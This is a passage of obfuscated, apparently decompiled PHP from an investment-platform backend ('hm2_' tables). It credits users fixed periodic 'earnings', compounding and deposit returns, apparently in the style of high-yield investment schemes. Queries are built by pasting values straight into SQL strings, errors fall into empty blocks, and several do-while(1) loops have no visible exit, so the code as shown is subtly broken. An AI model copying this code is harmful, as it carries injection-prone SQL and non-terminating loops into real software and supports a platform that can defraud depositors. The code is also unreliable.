                                        $elnlcnkyB = $elnlcDJLVk[$elnlcNjKgR['elnlcbTQC']];
                                    }
                                    $elnlcyASk = ( $elnlcgJtr + $elnlcnkyB ) * $elnlcELue[$elnlcNjKgR['elnlctVNTl']] / 100;
                                    $elnlcmagG = intval( $elnlcELue[$elnlcNjKgR['elnlchewMj']] );
                                    $q = "insert into hm2_deposits set \r\n\t\t           user_id = {$elnlcELue[$elnlcNjKgR['elnlclLVw']]},\r\n\t\t           type_id = {$elnlcELue[$elnlcNjKgR['elnlcAKAt']]},\r\n\t\t           deposit_date = '{$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]}' + interval {$elnlcItiUC},\r\n\t\t           last_pay_date = ('{$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]}' + interval {$elnlcItiUC}) + interval {$elnlcmagG} day,\r\n\t\t           status = 'on',\r\n\t\t           amount = {$elnlcyASk},\r\n\t\t           actual_amount = {$elnlcyASk},\r\n\t\t           compound = 0,\r\n\t\t           ec = {$elnlcELue[$elnlcNjKgR['elnlccwLV']]}    ";
                                    if ( !mysql_query( $q ) )
                                    {
                                    }
                                    $elnlcgNAw = mysql_insert_id( );
                                    $q = "insert into hm2_history set \r\n\t\t           user_id = {$elnlcELue[$elnlcNjKgR['elnlclLVw']]},\r\n\t\t           amount = -{$elnlcyASk},\r\n\t\t           actual_amount = -{$elnlcyASk},\r\n\t\t           type='deposit',\r\n\t\t           date = '{$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]}' + interval {$elnlcItiUC},\r\n\t\t           description = 'Deposit (reinvest)',\r\n\t\t           ec = {$elnlcELue[$elnlcNjKgR['elnlccwLV']]},\r\n\t\t           deposit_id = {$elnlcgNAw}    ";
                                    if ( !mysql_query( $q ) )
                                    {
                                    }
                                }
                            }
                        }
                        else
                        {
                            if ( 5 <= $elnlcIvDc && $elnlcELue[$elnlcNjKgR['elnlcFBaG']] == 1 )
                            {
                            }
                            else
                            {
                                if ( 0 < $elnlcELue[$elnlcNjKgR['elnlctVNTl']] && $elnlcELue[$elnlcNjKgR['elnlctVNTl']] <= 100 && $elnlcELue[$elnlcNjKgR['elnlcJQpQ']] == 1 )
                                {
                                    if ( $elnlcELue[$elnlcNjKgR['elnlcIhaw']] == 0 )
                                    {
                                        $elnlcELue[$elnlcNjKgR['elnlcIhaw']] = $elnlcELue[$elnlcNjKgR['elnlcHMum']] + 1;
                                    }
                                    if ( $elnlcELue[$elnlcNjKgR['elnlcPAec']] <= $elnlcELue[$elnlcNjKgR['elnlcHMum']] && $elnlcELue[$elnlcNjKgR['elnlcHMum']] <= $elnlcELue[$elnlcNjKgR['elnlcIhaw']] )
                                    {
                                        if ( $elnlcELue[$elnlcNjKgR['elnlcTjzT']] == 1 )
                                        {
                                            $elnlcGDKaO = preg_split( "/\\s*,\\s*/", $elnlcELue[$elnlcNjKgR['elnlcFIfO']] );
                                            if ( !in_array( $elnlcELue[$elnlcNjKgR['elnlctVNTl']], $elnlcGDKaO ) )
                                            {
                                                $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcGDKaO[0];
                                            }
                                        }
                                        else
                                        {
                                            if ( $elnlcELue[$elnlcNjKgR['elnlctVNTl']] < $elnlcELue[$elnlcNjKgR['elnlccFKts']] )
                                            {
                                                $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcELue[$elnlcNjKgR['elnlccFKts']];
                                            }
                                            if ( $elnlcELue[$elnlcNjKgR['elnlcckhi']] < $elnlcELue[$elnlcNjKgR['elnlctVNTl']] )
                                            {
                                                $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcELue[$elnlcNjKgR['elnlcckhi']];
                                            }
                                        }
                                    }
                                    else
                                    {
                                        $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcNjKgR['elnlcuSFVu'];
                                    }
                                    if ( 0 < $elnlcELue[$elnlcNjKgR['elnlctVNTl']] && $elnlcELue[$elnlcNjKgR['elnlctVNTl']] <= 100 )
                                    {
                                        $elnlcwGhG = $elnlcVrlk * $elnlcELue[$elnlcNjKgR['elnlctVNTl']] / 100;
                                        $elnlcVrlk = floor( ( floor( $elnlcVrlk * 100000 ) / 100000 - floor( $elnlcwGhG * 100000 ) / 100000 ) * 100 ) / 100;
                                        if ( $elnlcBHqbD[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] == 0 || $elnlcELue[$elnlcNjKgR['elnlcHMum']] + $elnlcwGhG < $elnlcBHqbD[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] )
                                        {
                                            $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                        amount = -{$elnlcwGhG},\r\n                    \t\ttype='deposit',\r\n                    \t\tdescription = 'Compounding deposit',\r\n                    \t\tactual_amount = -{$elnlcwGhG},\r\n                    \t\tec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    \t\tdate = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                                deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                            if ( !mysql_query( $q ) )
                                            {
                                            }
                                            $q = "update hm2_deposits set amount = amount + {$elnlcwGhG},\r\n                    \t\tactual_amount = actual_amount + {$elnlcwGhG}\r\n                    \t\twhere id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                            if ( !mysql_query( $q ) )
                                            {
                                            }
                                        }
                                    }
                                }
                                elnlcdohum( $elnlcELue[$elnlcNjKgR['elnlcohjn']], $elnlcVrlk, "date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}" );
                            }
                        }
                        $q = "update hm2_deposits set \r\n      \tq_pays = q_pays + 1, \r\n      \tlast_pay_date = last_pay_date + interval {$elnlcItiUC} {$elnlcgrDGC} where id =".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                } while ( 1 );
            }
            if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcDpHN'] )
            {
                $q = "select * from hm2_types where q_days > 0 and pay_by_button != 1";
            }
            else
            {
                $q = "select * from hm2_types where q_days > 0";
            }
            $elnlccfAC = mysql_query( $q );
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $elnlcDtGfo = $elnlcELue[$elnlcNjKgR['elnlciimMw']] + $elnlcELue[$elnlcNjKgR['elnlchewMj']] - ( 0 < $elnlcELue[delay] ? 1 : 0 );
                $elnlcstVj = $elnlcELue[$elnlcNjKgR['elnlcohjn']];
                if ( $elnlcELue[$elnlcNjKgR['elnlcPigm']] == 1 )
                {
                    $q = "select * from hm2_deposits where \r\n                type_id = {$elnlcstVj} and \r\n                status = 'on' and \r\n                user_id = {$elnlcRMjNn} and \r\n                (deposit_date + interval {$elnlcDtGfo} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < last_pay_date or deposit_date + interval {$elnlcDtGfo} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < now()) and\r\n                (({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} = 0) || ({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} && (deposit_date + interval {$elnlcELue[$elnlcNjKgR['elnlcjHPDN']]} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < now())))\r\n             ";
                    $elnlcqBcqg = mysql_query( $q );
                    while ( $elnlcChoo = mysql_fetch_array( $elnlcqBcqg ) )
                    {
                        $elnlcgJtr = $elnlcChoo[$elnlcNjKgR['elnlcHMum']];
                        $elnlcfUQT = "Deposit return";
                        if ( $elnlcELue[$elnlcNjKgR['elnlcFtDyn']] != 0 )
                        {
                            $elnlcgJtr = floor( $elnlcChoo[$elnlcNjKgR['elnlcHMum']] * ( 100 - $elnlcELue[$elnlcNjKgR['elnlcFtDyn']] ) ) / 100;
                            $elnlcfUQT = "Deposit return. {$elnlcELue[$elnlcNjKgR['elnlcFtDyn']]}% holded.";
                        }
                        $q = "insert into hm2_history set\r\n                user_id = ".$elnlcChoo[$elnlcNjKgR['elnlclLVw']].",\r\n      \t\tamount = ".$elnlcgJtr.",\r\n      \t\ttype='release_deposit',\r\n      \t\tactual_amount = ".$elnlcgJtr.",\r\n                ec = ".$elnlcChoo[$elnlcNjKgR['elnlccwLV']].",\r\n      \t\tdate = '".$elnlcChoo[$elnlcNjKgR['elnlcTChj']]."' + interval {$elnlcDtGfo} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" ).",\r\n                deposit_id = ".$elnlcChoo[$elnlcNjKgR['elnlcohjn']].",\r\n                description = '{$elnlcfUQT}'";
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                }
                $q = "update hm2_deposits set status='off' where \r\n             user_id = {$elnlcRMjNn} and \r\n    \t       (deposit_date + interval {$elnlcDtGfo} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < last_pay_date or deposit_date + interval {$elnlcDtGfo} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < now()) and\r\n             (({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} = 0) || ({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} && (deposit_date + interval {$elnlcELue[$elnlcNjKgR['elnlcjHPDN']]} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < now()))) and\r\n             type_id = {$elnlcstVj}\r\n           ";
                if ( !mysql_query( $q ) )
                {
                }
            }
            flock( $elnlcbEvg, LOCK_UN );
            fclose( $elnlcbEvg );
            unlink( "./tmpl_c/lock_user{$elnlcRMjNn}" );
        }
    }
}

function elnlcedbt( $elnlcCNAi )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    $elnlcCJNDN = array( );
    if ( $elnlccQgz[$elnlcNjKgR['elnlcozpI']] == 1 && $elnlcCNAi != -2 )
    {
    }
    else
    {
        $q = "select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = 'on' and hm2_types.id = hm2_plans.parent order by parent, min_deposit";
        if ( !( $elnlccfAC = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
        {
            $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcPpDvW']]][$elnlcELue[$elnlcNjKgR['elnlcohjn']]] = $elnlcELue;
        }
        $elnlcOrJNk = $elnlcNjKgR['elnlcqGMK'];
        $elnlcODMO = "u.last_access_time + interval 30 minute < now() ";
        if ( $elnlcCNAi == -1 )
        {
            $elnlcODMO = "1 = 1";
            $q = "select * from hm2_users where l_e_t + interval 15 minute < now() and status = 'on'";
        }
        else
        {
            $q = "select * from hm2_users where id = {$elnlcCNAi} and status = 'on'";
        }
        if ( $elnlcCNAi == -2 )
        {
            $q = "select * from hm2_users where status = 'on'";
            $q = "select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id";
        }
        if ( !( $elnlcwWcoU = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcGTJx = mysql_fetch_array( $elnlcwWcoU ) )
        {
            $elnlcRMjNn = $elnlcGTJx[$elnlcNjKgR['elnlcohjn']];
            $q = "update hm2_users set l_e_t = now() where id = {$elnlcRMjNn}";
            if ( !mysql_query( $q ) )
            {
            }
            $elnlcOrJNk = $elnlcNjKgR['elnlcqGMK'];
            while ( 0 < $elnlcOrJNk )
            {
                $q = "select \r\n              d.*, \r\n              t.period as period, t.use_compound as use_compound,\r\n              t.compound_min_deposit, t.compound_max_deposit,\r\n              t.compound_min_percent, t.compound_max_percent,\r\n              t.compound_percents_type, t.compound_percents,\r\n              t.work_week as work_week,\r\n              t.q_days as q_days, t.withdraw_principal,\r\n              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,\r\n              t.return_profit as return_profit\r\n            from\r\n              hm2_deposits as d,\r\n              hm2_types as t,\r\n              hm2_users as u\r\n            where \r\n              u.id = {$elnlcRMjNn} and \r\n              u.status = 'on' and \r\n              d.status='on' and \r\n              d.type_id = t.id and \r\n              t.status = 'on' and \r\n              u.id = d.user_id and\r\n              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / (60*60*24))) or t.q_days = 0) and \r\n              (\r\n                (d.last_pay_date + interval 1 hour <= now() and t.period = 'h')or\r\n                (d.last_pay_date + interval 1 day <= now() and t.period = 'd')or\r\n                (d.last_pay_date + interval 7 day <= now() and t.period = 'w') or\r\n                (d.last_pay_date + interval 14 day <= now() and t.period = 'b-w') or\r\n                (d.last_pay_date + interval 1 month <= now() and t.period = 'm') or\r\n                (d.last_pay_date + interval 2 month <= now() and t.period = '2m') or\r\n                (d.last_pay_date + interval 3 month <= now() and t.period = '3m') or\r\n                (d.last_pay_date + interval 6 month <= now() and t.period = '6m') or\r\n                (d.last_pay_date + interval 1 year <= now() and t.period = 'y') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = 'end') \r\n              ) and\r\n              ((t.q_days = 0) or \r\n                (               \r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = 'h') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = 'd') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = 'w') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = 'b-w') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = 'm') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = '2m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = '3m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = '6m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = 'y') or\r\n                (t.q_days > 0 and t.period = 'end') \r\n              ))";
                if ( !( $elnlccfAC = mysql_query( $q ) ) )
                {
                }
                $elnlcOrJNk = $elnlcNjKgR['elnlcuSFVu'];
                do
                {
                    if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
                    {
                        ++$elnlcOrJNk;
                        if ( !isset( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] ) )
                        {
                            continue;
                        }
                        $elnlcMPfma = $elnlcNjKgR['elnlcuSFVu'];
                        $elnlcfNqo = $elnlcNjKgR['elnlcuSFVu'];
                        reset( $elnlcCJNDN );
                        reset( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] );
                        $elnlcDrFtL = each( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] )[1];
                        $elnlcwody = each( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] )[0];
                        while ( each( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] ) )
                        {
                            if ( $elnlcDrFtL[$elnlcNjKgR['elnlcjlBJ']] <= $elnlcELue[$elnlcNjKgR['elnlcHMum']] && ( $elnlcELue[$elnlcNjKgR['elnlcHMum']] <= $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] || $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] == 0 ) )
                            {
                                $elnlcMPfma = $elnlcDrFtL[$elnlcNjKgR['elnlcLDncy']];
                            }
                            if ( $elnlcELue[$elnlcNjKgR['elnlcHMum']] < $elnlcDrFtL[$elnlcNjKgR['elnlcjlBJ']] && $elnlcMPfma == 0 )
                            {
                                $elnlcMPfma = $elnlcfNqo;
                            }
                            if ( $elnlcELue[$elnlcNjKgR['elnlcHMum']] < $elnlcDrFtL[$elnlcNjKgR['elnlcjlBJ']] && 0 < $elnlcMPfma )
                            {
                                break;
                            }
                            $elnlcfNqo = $elnlcDrFtL[$elnlcNjKgR['elnlcLDncy']];
                        }
                        if ( $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] != 0 && $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] < $elnlcELue[$elnlcNjKgR['elnlcHMum']] )
                        {
                            $elnlcMPfma = $elnlcfNqo;
                        }
                        $elnlcVrlk = $elnlcELue[$elnlcNjKgR['elnlcHMum']] * $elnlcMPfma / 100;
                        $elnlcItiUC = "";
                        if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcIRKW'] )
                        {
                            $elnlcItiUC = " 1 day ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] )
                        {
                            $elnlcItiUC = " 1 hour ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcaMSd'] )
                        {
                            $elnlcItiUC = " 7 day ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == "b-w" )
                        {
                            $elnlcItiUC = " 14 day ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcUSFe'] )
                        {
                            $elnlcItiUC = " 1 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcJJEVd'] )
                        {
                            $elnlcItiUC = " 2 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcrQnF'] )
                        {
                            $elnlcItiUC = " 3 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcrUjC'] )
                        {
                            $elnlcItiUC = " 6 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcdSav'] )
                        {
                            $elnlcItiUC = " 1 year ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlctCKl'] )
                        {
                            $elnlcItiUC = " ".$elnlcELue[$elnlcNjKgR['elnlciimMw']]." day ";
                        }
                        if ( $elnlcMPfma == 0 && $elnlcItiUC == "" )
                        {
                            continue;
                        }
                        $elnlcIvDc = -1;
                        $q = "select weekday('".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}) as dw";
                        if ( !( $elnlcdtez = mysql_query( $q ) ) )
                        {
                        }
                        while ( $elnlciJDQr = mysql_fetch_array( $elnlcdtez ) )
                        {
                            $elnlcIvDc = $elnlciJDQr[$elnlcNjKgR['elnlcSzOy']];
                        }
                        $q = "select count(id) as col from hm2_history where ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? " date_format(date, '%Y-%m-%d  %H') = date_format('".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}, '%Y-%m-%d  %H') and" : "to_days(date) = to_days('".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}) and " )." deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                        if ( !( $elnlcVoHIM = mysql_query( $q ) ) )
                        {
                        }
                        $elnlcjlas = $elnlcNjKgR['elnlcuSFVu'];
                        while ( $elnlcTyBK = mysql_fetch_array( $elnlcVoHIM ) )
                        {
                            $elnlcjlas = $elnlcTyBK[$elnlcNjKgR['elnlcmzAk']];
                        }
                        if ( $elnlcjlas == 0 )
                        {
                            if ( 5 <= $elnlcIvDc && $elnlcELue[$elnlcNjKgR['elnlcFBaG']] == 1 )
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                    amount = 0,\r\n                    type = 'earning',\r\n                    description = 'No interest on ".( $elnlcIvDc == 5 ? "Saturday" : "Sunday" )."',\r\n                    actual_amount = 0,\r\n                    date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                    ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                            }
                            else
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                    amount = {$elnlcVrlk},\r\n                    type = 'earning',\r\n                    description = 'Earning from deposit ".$elnlccQgz[$elnlcNjKgR['elnlcOAEP']].number_format( $elnlcELue[$elnlcNjKgR['elnlcHMum']], 2 )." - {$elnlcMPfma} %',\r\n                    actual_amount = {$elnlcVrlk},\r\n                    date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                    ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                            }
                        }
                        if ( !mysql_query( $q ) )
                        {
                        }
                        $elnlcgrDGC = "";
                        if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlctCKl'] )
                        {
                            if ( $elnlcELue[$elnlcNjKgR['elnlclVRTo']] == 0 || $elnlcELue[$elnlcNjKgR['elnlclVRTo']] && $elnlcELue[$elnlcNjKgR['elnlcNqiTF']] )
                            {
                                $elnlcgrDGC = ", status = 'off'";
                            }
                            if ( $elnlcELue[$elnlcNjKgR['elnlcPigm']] == 1 && ( $elnlcELue[$elnlcNjKgR['elnlclVRTo']] == 0 || $elnlcELue[$elnlcNjKgR['elnlclVRTo']] && $elnlcELue[$elnlcNjKgR['elnlcNqiTF']] ) )
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                    amount = ".$elnlcELue[$elnlcNjKgR['elnlcHMum']].",\r\n                    type='release_deposit',\r\n                    actual_amount = ".$elnlcELue[$elnlcNjKgR['elnlcHMum']].",\r\n                    ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                    deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                if ( !mysql_query( $q ) )
                                {
                                }
                            }
                        }
                        else
                        {
                            if ( 5 <= $elnlcIvDc && $elnlcELue[$elnlcNjKgR['elnlcFBaG']] == 1 )
                            {
                            }
                            else
                            {
                                if ( 0 < $elnlcELue[$elnlcNjKgR['elnlctVNTl']] && $elnlcELue[$elnlcNjKgR['elnlctVNTl']] <= 100 && $elnlcELue[$elnlcNjKgR['elnlcJQpQ']] == 1 )
                                {
                                    if ( $elnlcELue[$elnlcNjKgR['elnlcIhaw']] == 0 )
                                    {
                                        $elnlcELue[$elnlcNjKgR['elnlcIhaw']] = $elnlcELue[$elnlcNjKgR['elnlcHMum']] + 1;
                                    }
                                    if ( $elnlcELue[$elnlcNjKgR['elnlcPAec']] <= $elnlcELue[$elnlcNjKgR['elnlcHMum']] && $elnlcELue[$elnlcNjKgR['elnlcHMum']] <= $elnlcELue[$elnlcNjKgR['elnlcIhaw']] )
                                    {
                                        if ( $elnlcELue[$elnlcNjKgR['elnlcTjzT']] == 1 )
                                        {
                                            $elnlcGDKaO = preg_split( "/\\s*,\\s*/", $elnlcELue[$elnlcNjKgR['elnlcFIfO']] );
                                            if ( !in_array( $elnlcELue[$elnlcNjKgR['elnlctVNTl']], $elnlcGDKaO ) )
                                            {
                                                $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcGDKaO[0];
                                            }
                                        }
                                        else
                                        {
                                            if ( $elnlcELue[$elnlcNjKgR['elnlctVNTl']] < $elnlcELue[$elnlcNjKgR['elnlccFKts']] )
                                            {
                                                $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcELue[$elnlcNjKgR['elnlccFKts']];
                                            }
                                            if ( $elnlcELue[$elnlcNjKgR['elnlcckhi']] < $elnlcELue[$elnlcNjKgR['elnlctVNTl']] )
                                            {
                                                $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcELue[$elnlcNjKgR['elnlcckhi']];
                                            }
                                        }
                                    }
                                    else
                                    {
                                        $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcNjKgR['elnlcuSFVu'];
                                    }
                                    if ( 0 < $elnlcELue[$elnlcNjKgR['elnlctVNTl']] && $elnlcELue[$elnlcNjKgR['elnlctVNTl']] <= 100 )
                                    {
                                        $elnlcwGhG = $elnlcVrlk * $elnlcELue[$elnlcNjKgR['elnlctVNTl']] / 100;
                                        $elnlcVrlk = floor( ( floor( $elnlcVrlk * 100000 ) / 100000 - floor( $elnlcwGhG * 100000 ) / 100000 ) * 100 ) / 100;
                                        $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                        amount = -{$elnlcwGhG},\r\n                    \t\ttype='deposit',\r\n                    \t\tdescription = 'Compounding deposit',\r\n                    \t\tactual_amount = -{$elnlcwGhG},\r\n                    \t\tec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    \t\tdate = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                                deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                        $q = "update hm2_deposits set amount = amount + {$elnlcwGhG},\r\n                    \t\tactual_amount = actual_amount + {$elnlcwGhG}\r\n                    \t\twhere id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                    }
                                }
                                elnlcdohum( $elnlcELue[$elnlcNjKgR['elnlcohjn']], $elnlcVrlk, "date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}" );
                            }
                        }
                        $q = "update hm2_deposits set \r\n      \tq_pays = q_pays + 1, \r\n      \tlast_pay_date = last_pay_date + interval {$elnlcItiUC} {$elnlcgrDGC} where id =".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                } while ( 1 );
            }
            $q = "select * from hm2_types where q_days > 0";
            $elnlccfAC = mysql_query( $q );
            do
            {
                if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
                {
                    $elnlcDtGfo = $elnlcELue[$elnlcNjKgR['elnlciimMw']] + $elnlcELue[$elnlcNjKgR['elnlchewMj']] - ( 0 < $elnlcELue[$elnlcNjKgR['elnlchewMj']] ? 1 : 0 );
                    $elnlcstVj = $elnlcELue[$elnlcNjKgR['elnlcohjn']];
                    if ( $elnlcELue[$elnlcNjKgR['elnlcPigm']] == 1 )
                    {
                        $q = "select * from hm2_deposits where \r\n                type_id = {$elnlcstVj} and \r\n                status = 'on' and \r\n                user_id = {$elnlcRMjNn} and \r\n                (deposit_date + interval {$elnlcDtGfo} day < last_pay_date or deposit_date + interval {$elnlcDtGfo} day < now()) and\r\n                (({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} = 0) || ({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} && (deposit_date + interval {$elnlcELue[$elnlcNjKgR['elnlcjHPDN']]} day < now())))\r\n             ";
                        $elnlcqBcqg = mysql_query( $q );
                        while ( $elnlcChoo = mysql_fetch_array( $elnlcqBcqg ) )
                        {
                            $q = "insert into hm2_history set\r\n                user_id = ".$elnlcChoo[$elnlcNjKgR['elnlclLVw']].",\r\n      \t\tamount = ".$elnlcChoo[$elnlcNjKgR['elnlcHMum']].",\r\n      \t\ttype='release_deposit',\r\n      \t\tactual_amount = ".$elnlcChoo[$elnlcNjKgR['elnlcHMum']].",\r\n                      ec = ".$elnlcChoo[$elnlcNjKgR['elnlccwLV']].",\r\n      \t\tdate = '".$elnlcChoo[$elnlcNjKgR['elnlcTChj']]."' + interval {$elnlcDtGfo} day,\r\n                      deposit_id = ".$elnlcChoo[$elnlcNjKgR['elnlcohjn']];
                            if ( !mysql_query( $q ) )
                            {
                            }
                        }
                    }
                    $q = "update hm2_deposits set status='off' where \r\n             user_id = {$elnlcRMjNn} and \r\n    \t       (deposit_date + interval {$elnlcDtGfo} day < last_pay_date or deposit_date + interval {$elnlcDtGfo} day < now()) and\r\n             (({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} = 0) || ({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} && (deposit_date + interval {$elnlcELue[$elnlcNjKgR['elnlcjHPDN']]} day < now()))) and\r\n             type_id = {$elnlcstVj}\r\n           ";
                    if ( !mysql_query( $q ) )
                    {
                    }
                }
            } while ( 1 );
        }
    }
}

function elnlcrgxg( $a )
{
    global $elnlcNjKgR;
